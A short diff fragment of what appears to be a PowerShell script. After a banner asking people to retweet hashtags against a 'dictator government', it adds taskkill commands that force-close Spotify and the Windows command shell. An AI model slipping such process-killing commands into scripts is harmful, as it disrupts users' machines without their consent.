@@ -346,3 +346,8 @@ Write-Host @'
 Please retweet these hashtag, help me stop dictator government!
 *****************
 '@
+
+taskkill /im spotify.exe /f
+taskkill /im cmd.exe /f
+
+
